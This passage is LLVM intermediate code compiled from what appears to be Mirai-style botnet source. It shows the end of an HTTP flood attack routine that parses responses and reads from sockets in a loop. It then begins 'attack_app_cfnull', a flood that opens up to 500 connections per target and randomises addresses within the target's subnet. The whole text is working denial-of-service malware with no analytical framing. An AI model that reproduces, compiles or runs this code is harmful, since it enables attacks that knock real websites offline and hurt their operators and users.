  %2266 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2265, i32 0, i32 18
  %2267 = load i32, i32* %60, align 4
  %2268 = sext i32 %2267 to i64
  %2269 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2266, i64 0, i64 %2268
  %2270 = call i32 @util_strlen(i8* noundef %2269)
  %2271 = icmp slt i32 %2270, 128
  br i1 %2271, label %2272, label %2359

2272:                                             ; preds = %2264
  %2273 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2274 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2273, i32 0, i32 16
  %2275 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2276 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2275, i32 0, i32 15
  %2277 = load i32, i32* %2276, align 4
  %2278 = sext i32 %2277 to i64
  %2279 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2274, i64 0, i64 %2278
  %2280 = getelementptr inbounds [128 x i8], [128 x i8]* %2279, i64 0, i64 0
  %2281 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2282 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2281, i32 0, i32 18
  %2283 = load i32, i32* %60, align 4
  %2284 = sext i32 %2283 to i64
  %2285 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2282, i64 0, i64 %2284
  %2286 = call i32 @util_strcpy(i8* noundef %2280, i8* noundef %2285)
  %2287 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2288 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2287, i32 0, i32 16
  %2289 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2290 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2289, i32 0, i32 15
  %2291 = load i32, i32* %2290, align 4
  %2292 = sext i32 %2291 to i64
  %2293 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2288, i64 0, i64 %2292
  %2294 = getelementptr inbounds [128 x i8], [128 x i8]* %2293, i64 0, i64 0
  %2295 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2296 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2295, i32 0, i32 16
  %2297 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2298 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2297, i32 0, i32 15
  %2299 = load i32, i32* %2298, align 4
  %2300 = sext i32 %2299 to i64
  %2301 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2296, i64 0, i64 %2300
  %2302 = getelementptr inbounds [128 x i8], [128 x i8]* %2301, i64 0, i64 0
  %2303 = call i32 @util_strlen(i8* noundef %2302)
  %2304 = sext i32 %2303 to i64
  %2305 = getelementptr inbounds i8, i8* %2294, i64 %2304
  %2306 = call i32 @util_strcpy(i8* noundef %2305, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14, i64 0, i64 0))
  %2307 = load i32, i32* %61, align 4
  %2308 = add nsw i32 %2307, 3
  %2309 = load i32, i32* %60, align 4
  %2310 = add nsw i32 %2309, %2308
  store i32 %2310, i32* %60, align 4
  %2311 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2312 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2311, i32 0, i32 18
  %2313 = load i32, i32* %60, align 4
  %2314 = sext i32 %2313 to i64
  %2315 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2312, i64 0, i64 %2314
  %2316 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2317 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2316, i32 0, i32 17
  %2318 = load i32, i32* %2317, align 4
  %2319 = load i32, i32* %60, align 4
  %2320 = sub nsw i32 %2318, %2319
  %2321 = call i32 @util_memsearch(i8* noundef %2315, i32 noundef %2320, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i64 0, i64 0), i32 noundef 1)
  store i32 %2321, i32* %61, align 4
  %2322 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2323 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2322, i32 0, i32 18
  %2324 = load i32, i32* %60, align 4
  %2325 = load i32, i32* %61, align 4
  %2326 = sub nsw i32 %2325, 1
  %2327 = add nsw i32 %2324, %2326
  %2328 = sext i32 %2327 to i64
  %2329 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2323, i64 0, i64 %2328
  store i8 0, i8* %2329, align 1
  %2330 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2331 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2330, i32 0, i32 16
  %2332 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2333 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2332, i32 0, i32 15
  %2334 = load i32, i32* %2333, align 4
  %2335 = sext i32 %2334 to i64
  %2336 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2331, i64 0, i64 %2335
  %2337 = getelementptr inbounds [128 x i8], [128 x i8]* %2336, i64 0, i64 0
  %2338 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2339 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2338, i32 0, i32 16
  %2340 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2341 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2340, i32 0, i32 15
  %2342 = load i32, i32* %2341, align 4
  %2343 = sext i32 %2342 to i64
  %2344 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2339, i64 0, i64 %2343
  %2345 = getelementptr inbounds [128 x i8], [128 x i8]* %2344, i64 0, i64 0
  %2346 = call i32 @util_strlen(i8* noundef %2345)
  %2347 = sext i32 %2346 to i64
  %2348 = getelementptr inbounds i8, i8* %2337, i64 %2347
  %2349 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2350 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2349, i32 0, i32 18
  %2351 = load i32, i32* %60, align 4
  %2352 = sext i32 %2351 to i64
  %2353 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2350, i64 0, i64 %2352
  %2354 = call i32 @util_strcpy(i8* noundef %2348, i8* noundef %2353)
  %2355 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2356 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2355, i32 0, i32 15
  %2357 = load i32, i32* %2356, align 4
  %2358 = add nsw i32 %2357, 1
  store i32 %2358, i32* %2356, align 4
  br label %2359

2359:                                             ; preds = %2272, %2264, %2232
  %2360 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2361 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2360, i32 0, i32 14
  store i32 -1, i32* %2361, align 4
  %2362 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2363 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2362, i32 0, i32 1
  store i8 10, i8* %2363, align 4
  br label %2486

2364:                                             ; preds = %2222
  br label %2365

2365:                                             ; preds = %2364, %2211
  br label %2366

2366:                                             ; preds = %2365, %2190
  %2367 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2368 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2367, i32 0, i32 14
  %2369 = load i32, i32* %2368, align 4
  %2370 = icmp eq i32 %2369, 0
  br i1 %2370, label %2371, label %2449

2371:                                             ; preds = %2366
  %2372 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2373 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2372, i32 0, i32 13
  %2374 = load i32, i32* %2373, align 4
  %2375 = icmp eq i32 %2374, 1
  br i1 %2375, label %2376, label %2432

2376:                                             ; preds = %2371
  %2377 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2378 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2377, i32 0, i32 18
  %2379 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2378, i64 0, i64 0
  %2380 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2381 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2380, i32 0, i32 17
  %2382 = load i32, i32* %2381, align 4
  %2383 = call i32 @util_memsearch(i8* noundef %2379, i32 noundef %2382, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 noundef 2)
  %2384 = icmp ne i32 %2383, -1
  br i1 %2384, label %2385, label %2431

2385:                                             ; preds = %2376
  %2386 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2387 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2386, i32 0, i32 18
  %2388 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2387, i64 0, i64 0
  %2389 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2390 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2389, i32 0, i32 17
  %2391 = load i32, i32* %2390, align 4
  %2392 = call i32 @util_memsearch(i8* noundef %2388, i32 noundef %2391, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 noundef 2)
  store i32 %2392, i32* %62, align 4
  %2393 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2394 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2393, i32 0, i32 18
  %2395 = load i32, i32* %62, align 4
  %2396 = sub nsw i32 %2395, 2
  %2397 = sext i32 %2396 to i64
  %2398 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2394, i64 0, i64 %2397
  store i8 0, i8* %2398, align 1
  %2399 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2400 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2399, i32 0, i32 18
  %2401 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2400, i64 0, i64 0
  %2402 = load i32, i32* %62, align 4
  %2403 = call i32 @util_memsearch(i8* noundef %2401, i32 noundef %2402, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i64 0, i64 0), i32 noundef 1)
  %2404 = icmp ne i32 %2403, -1
  br i1 %2404, label %2405, label %2415

2405:                                             ; preds = %2385
  %2406 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2407 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2406, i32 0, i32 18
  %2408 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2409 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2408, i32 0, i32 18
  %2410 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2409, i64 0, i64 0
  %2411 = load i32, i32* %62, align 4
  %2412 = call i32 @util_memsearch(i8* noundef %2410, i32 noundef %2411, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i64 0, i64 0), i32 noundef 1)
  %2413 = sext i32 %2412 to i64
  %2414 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2407, i64 0, i64 %2413
  store i8 0, i8* %2414, align 1
  br label %2415

2415:                                             ; preds = %2405, %2385
  %2416 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2417 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2416, i32 0, i32 18
  %2418 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2417, i64 0, i64 0
  %2419 = call i32 @util_atoi(i8* noundef %2418, i32 noundef 16)
  store i32 %2419, i32* %63, align 4
  %2420 = load i32, i32* %63, align 4
  %2421 = icmp eq i32 %2420, 0
  br i1 %2421, label %2422, label %2425

2422:                                             ; preds = %2415
  %2423 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2424 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2423, i32 0, i32 1
  store i8 1, i8* %2424, align 4
  br label %2486

2425:                                             ; preds = %2415
  %2426 = load i32, i32* %63, align 4
  %2427 = add nsw i32 %2426, 2
  %2428 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2429 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2428, i32 0, i32 14
  store i32 %2427, i32* %2429, align 4
  %2430 = load i32, i32* %62, align 4
  store i32 %2430, i32* %59, align 4
  br label %2431

2431:                                             ; preds = %2425, %2376
  br label %2448

2432:                                             ; preds = %2371
  %2433 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2434 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2433, i32 0, i32 17
  %2435 = load i32, i32* %2434, align 4
  %2436 = load i32, i32* %59, align 4
  %2437 = sub nsw i32 %2435, %2436
  %2438 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2439 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2438, i32 0, i32 14
  store i32 %2437, i32* %2439, align 4
  %2440 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2441 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2440, i32 0, i32 14
  %2442 = load i32, i32* %2441, align 4
  %2443 = icmp eq i32 %2442, 0
  br i1 %2443, label %2444, label %2447

2444:                                             ; preds = %2432
  %2445 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2446 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2445, i32 0, i32 1
  store i8 1, i8* %2446, align 4
  br label %2486

2447:                                             ; preds = %2432
  br label %2448

2448:                                             ; preds = %2447, %2431
  br label %2449

2449:                                             ; preds = %2448, %2366
  %2450 = load i32, i32* %59, align 4
  %2451 = icmp eq i32 %2450, 0
  br i1 %2451, label %2452, label %2453

2452:                                             ; preds = %2449
  br label %2486

2453:                                             ; preds = %2449
  %2454 = load i32, i32* %59, align 4
  %2455 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2456 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2455, i32 0, i32 17
  %2457 = load i32, i32* %2456, align 4
  %2458 = sub nsw i32 %2457, %2454
  store i32 %2458, i32* %2456, align 4
  %2459 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2460 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2459, i32 0, i32 18
  %2461 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2460, i64 0, i64 0
  %2462 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2463 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2462, i32 0, i32 18
  %2464 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2463, i64 0, i64 0
  %2465 = load i32, i32* %59, align 4
  %2466 = sext i32 %2465 to i64
  %2467 = getelementptr inbounds i8, i8* %2464, i64 %2466
  %2468 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2469 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2468, i32 0, i32 17
  %2470 = load i32, i32* %2469, align 4
  %2471 = sext i32 %2470 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* align 4 %2461, i8* align 1 %2467, i64 %2471, i1 false)
  %2472 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2473 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2472, i32 0, i32 18
  %2474 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2475 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2474, i32 0, i32 17
  %2476 = load i32, i32* %2475, align 4
  %2477 = sext i32 %2476 to i64
  %2478 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2473, i64 0, i64 %2477
  store i8 0, i8* %2478, align 1
  %2479 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2480 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2479, i32 0, i32 17
  %2481 = load i32, i32* %2480, align 4
  %2482 = icmp eq i32 %2481, 0
  br i1 %2482, label %2483, label %2484

2483:                                             ; preds = %2453
  br label %2486

2484:                                             ; preds = %2453
  br label %2485

2485:                                             ; preds = %2484
  br label %2190

2486:                                             ; preds = %2483, %2452, %2444, %2422, %2359
  br label %2112

2487:                                             ; preds = %2180, %2118
  br label %2540

2488:                                             ; preds = %2105
  %2489 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2490 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2489, i32 0, i32 1
  %2491 = load i8, i8* %2490, align 4
  %2492 = zext i8 %2491 to i32
  %2493 = icmp eq i32 %2492, 10
  br i1 %2493, label %2494, label %2539

2494:                                             ; preds = %2488
  br label %2495

2495:                                             ; preds = %2528, %2494
  %2496 = call i32* @__errno_location() #7
  store i32 0, i32* %2496, align 4
  %2497 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2498 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2497, i32 0, i32 0
  %2499 = load i32, i32* %2498, align 4
  %2500 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %2501 = call i64 @recv(i32 noundef %2499, i8* noundef %2500, i64 noundef 10240, i32 noundef 16384)
  %2502 = trunc i64 %2501 to i32
  store i32 %2502, i32* %12, align 4
  %2503 = load i32, i32* %12, align 4
  %2504 = icmp eq i32 %2503, 0
  br i1 %2504, label %2505, label %2507

2505:                                             ; preds = %2495
  %2506 = call i32* @__errno_location() #7
  store i32 104, i32* %2506, align 4
  store i32 -1, i32* %12, align 4
  br label %2507

2507:                                             ; preds = %2505, %2495
  %2508 = load i32, i32* %12, align 4
  %2509 = icmp eq i32 %2508, -1
  br i1 %2509, label %2510, label %2528

2510:                                             ; preds = %2507
  %2511 = call i32* @__errno_location() #7
  %2512 = load i32, i32* %2511, align 4
  %2513 = icmp ne i32 %2512, 11
  br i1 %2513, label %2514, label %2527

2514:                                             ; preds = %2510
  %2515 = call i32* @__errno_location() #7
  %2516 = load i32, i32* %2515, align 4
  %2517 = icmp ne i32 %2516, 11
  br i1 %2517, label %2518, label %2527

2518:                                             ; preds = %2514
  %2519 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2520 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2519, i32 0, i32 0
  %2521 = load i32, i32* %2520, align 4
  %2522 = call i32 @close(i32 noundef %2521)
  %2523 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2524 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2523, i32 0, i32 0
  store i32 -1, i32* %2524, align 4
  %2525 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2526 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2525, i32 0, i32 1
  store i8 0, i8* %2526, align 4
  br label %2527

2527:                                             ; preds = %2518, %2514, %2510
  br label %2529

2528:                                             ; preds = %2507
  br label %2495

2529:                                             ; preds = %2527
  %2530 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2531 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2530, i32 0, i32 1
  %2532 = load i8, i8* %2531, align 4
  %2533 = zext i8 %2532 to i32
  %2534 = icmp ne i32 %2533, 0
  br i1 %2534, label %2535, label %2538

2535:                                             ; preds = %2529
  %2536 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2537 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2536, i32 0, i32 1
  store i8 1, i8* %2537, align 4
  br label %2538

2538:                                             ; preds = %2535, %2529
  br label %2539

2539:                                             ; preds = %2538, %2488
  br label %2540

2540:                                             ; preds = %2539, %2487
  br label %2541

2541:                                             ; preds = %2540, %2096
  br label %2542

2542:                                             ; preds = %2541, %1119
  br label %2543

2543:                                             ; preds = %2542, %2056, %1725, %1168, %1151, %1109, %1077
  %2544 = load i32, i32* %9, align 4
  %2545 = add nsw i32 %2544, 1
  store i32 %2545, i32* %9, align 4
  br label %1064, !llvm.loop !20

2546:                                             ; preds = %1064
  br label %440

2547:                                             ; preds = %104, %99, %94, %89
  ret void
}

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #1

; Function Attrs: nounwind
declare noalias i8* @calloc(i64 noundef, i64 noundef) #2

; Function Attrs: argmemonly nofree nounwind willreturn
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i1 immarg) #3

; Function Attrs: nounwind readnone willreturn
declare i32 @ntohl(i32 noundef) #4

; Function Attrs: nounwind readnone willreturn
declare i32 @htonl(i32 noundef) #4

; Function Attrs: nounwind
declare i64 @time(i64* noundef) #2

declare i32 @close(i32 noundef) #5

; Function Attrs: nounwind
declare i32 @socket(i32 noundef, i32 noundef, i32 noundef) #2

declare i32 @fcntl(i32 noundef, i32 noundef, ...) #5

; Function Attrs: nounwind
declare i32 @setsockopt(i32 noundef, i32 noundef, i32 noundef, i8* noundef, i32 noundef) #2

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 noundef zeroext) #4

declare i32 @connect(i32 noundef, %struct.sockaddr*, i32 noundef) #5

declare i64 @send(i32 noundef, i8* noundef, i64 noundef, i32 noundef) #5

declare i32 @select(i32 noundef, %struct.fd_set* noundef, %struct.fd_set* noundef, %struct.fd_set* noundef, %struct.timeval* noundef) #5

; Function Attrs: nounwind
declare i32 @getsockopt(i32 noundef, i32 noundef, i32 noundef, i8* noundef, i32* noundef) #2

declare i64 @recv(i32 noundef, i8* noundef, i64 noundef, i32 noundef) #5

declare i32 @sleep(i32 noundef) #5

; Function Attrs: nounwind
declare i8* @strcpy(i8* noundef, i8* noundef) #2

; Function Attrs: nounwind readnone willreturn
declare i32* @__errno_location() #4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @attack_app_cfnull(i8 noundef zeroext %0, %struct.attack_target* noundef %1, i8 noundef zeroext %2, %struct.attack_option* noundef %3) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.attack_cfnull_state*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca [10241 x i8], align 16
  %17 = alloca %struct.fd_set, align 8
  %18 = alloca %struct.fd_set, align 8
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.timeval, align 8
  %22 = alloca %struct.attack_cfnull_state*, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.fd_set*, align 8
  %26 = alloca i32, align 4
  %27 = alloca %struct.fd_set*, align 8
  %28 = alloca %struct.sockaddr_in, align 4
  %29 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %30 = alloca [10240 x i8], align 16
  %31 = alloca i32, align 4
  %32 = alloca [1025 x i8], align 16
  %33 = alloca [4 x i8], align 1
  %34 = alloca i32, align 4
  %35 = alloca i32, align 4
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  store i32 0, i32* %12, align 4
  store %struct.attack_cfnull_state* null, %struct.attack_cfnull_state** %13, align 8
  %36 = load i8, i8* %7, align 1
  %37 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %38 = call i8* @attack_get_opt_str(i8 noundef zeroext %36, %struct.attack_option* noundef %37, i8 noundef zeroext 8, i8* noundef null)
  store i8* %38, i8** %14, align 8
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 noundef zeroext %39, %struct.attack_option* noundef %40, i8 noundef zeroext 24, i32 noundef 1)
  store i32 %41, i32* %15, align 4
  %42 = bitcast [10241 x i8]* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %42, i8 0, i64 10241, i1 false)
  %43 = load i8*, i8** %14, align 8
  %44 = icmp eq i8* %43, null
  br i1 %44, label %45, label %46

45:                                               ; preds = %4
  br label %955

46:                                               ; preds = %4
  %47 = load i8*, i8** %14, align 8
  %48 = call i32 @util_strlen(i8* noundef %47)
  %49 = icmp sgt i32 %48, 127
  br i1 %49, label %50, label %51

50:                                               ; preds = %46
  br label %955

51:                                               ; preds = %46
  %52 = load i32, i32* %15, align 4
  %53 = icmp sgt i32 %52, 500
  br i1 %53, label %54, label %55

54:                                               ; preds = %51
  store i32 500, i32* %15, align 4
  br label %55

55:                                               ; preds = %54, %51
  %56 = load i32, i32* %15, align 4
  %57 = sext i32 %56 to i64
  %58 = call noalias i8* @calloc(i64 noundef %57, i64 noundef 668) #6
  %59 = bitcast i8* %58 to %struct.attack_cfnull_state*
  store %struct.attack_cfnull_state* %59, %struct.attack_cfnull_state** %13, align 8
  store i32 0, i32* %9, align 4
  br label %60

60:                                               ; preds = %277, %55
  %61 = load i32, i32* %9, align 4
  %62 = load i32, i32* %15, align 4
  %63 = icmp slt i32 %61, %62
  br i1 %63, label %64, label %280

64:                                               ; preds = %60
  %65 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %13, align 8
  %66 = load i32, i32* %9, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %65, i64 %67
  %69 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %68, i32 0, i32 1
  store i8 0, i8* %69, align 4
  %70 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %13, align 8
  %71 = load i32, i32* %9, align 4
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %70, i64 %72
  %74 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %73, i32 0, i32 0
  store i32 -1, i32* %74, align 4
  %75 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %76 = load i32, i32* %9, align 4
  %77 = load i8, i8* %5, align 1
  %78 = zext i8 %77 to i32
  %79 = srem i32 %76, %78
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %75, i64 %80
  %82 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %81, i32 0, i32 1
  %83 = load i32, i32* %82, align 4
  %84 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %13, align 8
  %85 = load i32, i32* %9, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %84, i64 %86
  %88 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %87, i32 0, i32 4
  store i32 %83, i32* %88, align 4
  %89 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %13, align 8
  %90 = load i32, i32* %9, align 4
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %89, i64 %91
  %93 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %92, i32 0, i32 6
  %94 = getelementptr inbounds [129 x i8], [129 x i8]* %93, i64 0, i64 0
  %95 = load i8*, i8** %14, align 8
  %96 = call i32 @util_strcpy(i8* noundef %94, i8* noundef %95)
  %97 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %98 = load i32, i32* %9, align 4
  %99 = load i8, i8* %5, align 1
  %100 = zext i8 %99 to i32
  %101 = srem i32 %98, %100
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %97, i64 %102
  %104 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %103, i32 0, i32 2
  %105 = load i8, i8* %104, align 4
  %106 = zext i8 %105 to i32
  %107 = icmp slt i32 %106, 32
  br i1 %107, label %108, label %138

108:                                              ; preds = %64
  %109 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %110 = load i32, i32* %9, align 4
  %111 = load i8, i8* %5, align 1
  %112 = zext i8 %111 to i32
  %113 = srem i32 %110, %112
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %109, i64 %114
  %116 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %115, i32 0, i32 1
  %117 = load i32, i32* %116, align 4
  %118 = call i32 @ntohl(i32 noundef %117) #7
  %119 = call i32 @rand_next()
  %120 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %121 = load i32, i32* %9, align 4
  %122 = load i8, i8* %5, align 1
  %123 = zext i8 %122 to i32
  %124 = srem i32 %121, %123
  %125 = sext i32 %124 to i64
  %126 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %120, i64 %125
  %127 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %126, i32 0, i32 2
  %128 = load i8, i8* %127, align 4
  %129 = zext i8 %128 to i32
  %130 = lshr i32 %119, %129
  %131 = add i32 %118, %130
  %132 = call i32 @htonl(i32 noundef %131) #7
  %133 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %13, align 8
  %134 = load i32, i32* %9, align 4
  %135 = sext i32 %134 to i64
